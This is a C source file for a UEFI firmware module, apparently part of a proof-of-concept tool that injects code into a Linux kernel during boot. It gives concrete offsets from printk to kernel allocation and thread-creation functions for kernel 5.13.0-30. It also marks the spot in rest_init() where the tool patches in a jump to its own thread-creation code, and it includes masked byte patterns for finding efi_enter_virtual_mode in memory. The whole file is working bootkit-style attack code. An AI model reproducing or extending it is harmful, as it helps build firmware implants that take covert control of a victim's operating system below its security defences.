#include "kernel_config.h"
#include "inject_context.h"
#include "logging.h"
#include <Library/BaseLib.h>
#include <Library/DebugLib.h>

//
// Kernel offset configuration table
// Add new kernel versions here as they are validated
//

//
// Ubuntu 20.04.4 - Linux 5.13.0-30-generic
// Original POC target kernel
//
CONST KERNEL_OFFSET_CONFIG gKernelConfig_5_13_0_30 = {
    .Version = KernelVersion_5_13_0_30,
    .VersionString = "5.13.0-30-generic",

    //
    // Function offsets relative to printk
    // Source: System.map-5.13.0-30-generic
    // These values are SIGNED offsets calculated as:
    //   offset = target_function_addr - printk_addr
    //
    // Example from System.map:
    //   ffffffffb4da1d56 T printk
    //   ffffffffb40e93d0 T __kmalloc
    //   Offset = 0xb40e93d0 - 0xb4da1d56 = -0x8b8986
    //
    .PrintkToKmalloc = -0x8b8986,
    .PrintkToMsleep = -0xa5f1e6,
    .PrintkToKthreadCreateOnNode = -0xad5e66,

    //
    // Offset within rest_init() to the call to complete(&kthreadd_done)
    // This is where we patch in our jump to the thread creation code
    //
    .RestInitToCompleteOffset = 0xa4,

    //
    // Pattern for identifying efi_enter_virtual_mode return address
    // This pattern matches the code following the SVAM callback
    //
    .EfiEnterVirtualModePattern = {
        0x48, 0x89, 0xc6,       // mov rsi, rax
        0x48, 0x85, 0xc0,       // test rax, rax
        0x74, 0x0e,             // je <offset>
        0x48, 0xc7, 0xc7,       // mov rdi, <immediate>
        0x40, 0xcd, 0x9b,       // <immediate bytes 1-2 (can vary)>
        0xb1, 0xe8,             // <immediate bytes 3-4 (can vary)>
        0x7d, 0x63, 0x9b, 0xfe, // call <printk offset>
        0xeb, 0x2d,             // jmp <offset>
        0xe8, 0x80, 0x39, 0x04, // call <offset>
        0x00, 0xe8, 0x62, 0xf1, // <continuation>
        0xff, 0xff              // <continuation>
    },

    //
    // Pattern mask: 0xFF = byte must match, 0x00 = ignore byte
    // Bytes 13 and 14 (immediate value bytes) can vary
    //
    .EfiEnterVirtualModePatternMask = {
        0xFF, 0xFF, 0xFF,       // mov rsi, rax
        0xFF, 0xFF, 0xFF,       // test rax, rax
        0xFF, 0xFF,             // je
        0xFF, 0xFF, 0xFF,       // mov rdi
        0x00, 0x00,             // <variable immediate bytes>
        0xFF, 0xFF,             // <fixed immediate bytes>
        0xFF, 0xFF, 0xFF, 0xFF, // call
        0xFF, 0xFF,             // jmp
        0xFF, 0xFF, 0xFF, 0xFF, // call
        0xFF, 0xFF, 0xFF, 0xFF, // continuation
        0xFF, 0xFF              // continuation
    },

    .EfiEnterVirtualModePatternSize = 32
};

//
// Configuration table - add new kernel versions here
//
CONST KERNEL_OFFSET_CONFIG* gKernelConfigTable[] = {
    &gKernelConfig_5_13_0_30,
    NULL  // Sentinel
};

//
// Default configuration (currently 5.13.0-30)
//
CONST KERNEL_OFFSET_CONFIG* gDefaultKernelConfig = &gKernelConfig_5_13_0_30;

/**
 * Initialize the kernel configuration system
 */
EFI_STATUS
EFIAPI
InitializeKernelConfig(
    OUT INJECT_CONFIG* Config
)
{
    if (Config == NULL) {
        return EFI_INVALID_PARAMETER;
    }

    //
    // Initialize with default configuration
    // In future, this could perform auto-detection
    //
    Config->DetectedVersion = KernelVersion_5_13_0_30;
    Config->KernelConfig = gDefaultKernelConfig;
    Config->ThreadConfig = NULL;  // Set by caller if needed

    return EFI_SUCCESS;
}

/**
 * Get kernel offset configuration for a specific version
 */
CONST KERNEL_OFFSET_CONFIG*
EFIAPI
GetKernelOffsetConfig(
    IN KERNEL_VERSION Version
)
{
    UINTN i;

    //
    // Search configuration table for matching version
    //
    for (i = 0; gKernelConfigTable[i] != NULL; i++) {
        if (gKernelConfigTable[i]->Version == Version) {
            return gKernelConfigTable[i];
        }
    }

    //
    // Not found - return default
    //
    return gDefaultKernelConfig;
}

/**
 * Detect kernel version based on discovered kernel structures
 *
 * Currently returns default version. This can be extended to:
 * - Parse version strings from kernel .rodata
 * - Use signature-based detection
 * - Validate offsets by checking known function prologues
 */
KERNEL_VERSION
EFIAPI
DetectKernelVersion(
    IN UINT8* PrintkAddr
)
{
    //
    // TODO: Implement version detection heuristics
    // For now, return default version
    //
    // Future enhancements could:
    // 1. Search for linux_banner string in kernel .rodata
    // 2. Validate function signatures at calculated addresses
    // 3. Use pattern matching on known kernel structures
    //
    UNREFERENCED_PARAMETER(PrintkAddr);

    return KernelVersion_5_13_0_30;
}

/**
 * Calculate kernel function address from printk and offset config
 *
 * Validates the result is in kernel address range and checks for overflow
 *
 * @param PrintkAddr    Base address (printk function)
 * @param Offset        Signed offset from printk to target function
 * @return Calculated address, or NULL on error
 */
UINT8*
EFIAPI
CalculateKernelAddress(
    IN UINT8* PrintkAddr,
    IN INT64 Offset
)
{
    UINT8* Result;

    if (PrintkAddr == NULL) {
        LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER,
                 "PrintkAddr is NULL in CalculateKernelAddress");
        return NULL;
    }

    //
    // Validate PrintkAddr is in kernel range before calculation
    //
    if ((UINT64)PrintkAddr < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "PrintkAddr 0x%llx below kernel minimum",
                 (UINT64)PrintkAddr);
        return NULL;
    }

    //
    // Apply signed offset to base address
    // Cast to INT64 for arithmetic to handle negative offsets correctly
    //
    Result = (UINT8*)((INT64)PrintkAddr + Offset);

    //
    // Validate result is in kernel address range
    //
    if ((UINT64)Result < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "Calculated address 0x%llx (printk 0x%llx + offset %lld) below kernel minimum 0x%llx",
                 (UINT64)Result, (UINT64)PrintkAddr, Offset, INJECT_MIN_KERNEL_ADDRESS);
        return NULL;
    }

    return Result;
}

/**
 * Verify pattern match with mask support
 *
 * @param Data          Data buffer to check
 * @param Pattern       Pattern to match
 * @param Mask          Mask indicating which bytes must match (0xFF) vs ignore (0x00)
 * @param Size          Size of pattern/mask in bytes
 * @return TRUE if pattern matches, FALSE otherwise
 */
BOOLEAN
EFIAPI
VerifyPatternWithMask(
    IN CONST UINT8* Data,
    IN CONST UINT8* Pattern,
    IN CONST UINT8* Mask,
    IN UINTN Size
)
{
    UINTN i;

    //
    // Validate input parameters
    //
    if (Data == NULL || Pattern == NULL || Mask == NULL) {
        LOG_ERROR(INJECT_ERROR_EEVM_PATTERN_MISMATCH,
                 "Invalid pattern validation parameters (NULL pointer)");
        return FALSE;
    }

    if (Size == 0) {
        LOG_ERROR(INJECT_ERROR_EEVM_PATTERN_MISMATCH,
                 "Invalid pattern validation size (zero)");
        return FALSE;
    }

    //
    // Validate Data pointer is in kernel address range
    //
    if ((UINT64)Data < INJECT_MIN_KERNEL_ADDRESS) {
        LOG_ERROR(INJECT_ERROR_ADDRESS_OUT_OF_RANGE,
                 "Data pointer 0x%llx outside kernel range for pattern validation",
                 (UINT64)Data);
        return FALSE;
    }

    for (i = 0; i < Size; i++) {
        //
        // If mask byte is 0xFF, byte must match exactly
        // If mask byte is 0x00, ignore this byte
        //
        if (Mask[i] == 0xFF) {
            if (Data[i] != Pattern[i]) {
                return FALSE;
            }
        }
    }

    return TRUE;
}

/**
 * Verify if code matches efi_enter_virtual_mode pattern
 *
 * @param CodePtr       Pointer to code to verify
 * @param Config        Kernel configuration containing pattern
 * @return TRUE if pattern matches, FALSE otherwise
 */
BOOLEAN
EFIAPI
VerifyEfiEnterVirtualModePattern(
    IN UINT8* CodePtr,
    IN CONST KERNEL_OFFSET_CONFIG* Config
)
{
    UINT64 StringPtr;

    if (CodePtr == NULL || Config == NULL) {
        return FALSE;
    }

    //
    // First verify the byte pattern with mask
    //
    if (!VerifyPatternWithMask(CodePtr,
                               Config->EfiEnterVirtualModePattern,
                               Config->EfiEnterVirtualModePatternMask,
                               Config->EfiEnterVirtualModePatternSize)) {
        return FALSE;
    }

    //
    // Additionally verify the error string to be more confident
    // The mov rdi instruction at offset 0x0b contains a pointer to the error string
    //

    // Validate we can safely read the offset at CodePtr + 0x0b
    if ((UINT64)(CodePtr + 0x0b) < INJECT_MIN_KERNEL_ADDRESS) {
        return FALSE;
    }

    StringPtr = (UINT64)(INT64)*(INT32*)(CodePtr + 0x0b);
    StringPtr += 2;  // Adjust for instruction encoding

    // Validate the computed string pointer is in kernel address range
    if (StringPtr < INJECT_MIN_KERNEL_ADDRESS) {
        return FALSE;
    }

    // Validate string pointer is reasonable (not too far from code)
    // Kernel .rodata typically within 2GB of code
    if (StringPtr > (UINT64)CodePtr + 0x80000000ULL ||
        StringPtr < (UINT64)CodePtr - 0x80000000ULL) {
        return FALSE;
    }

    if (AsciiStrCmp((CHAR8*)StringPtr,
                    "efi: Unable to switch EFI into virtual mode (status=%lx)!\n") != 0) {
        return FALSE;
    }

    return TRUE;
}
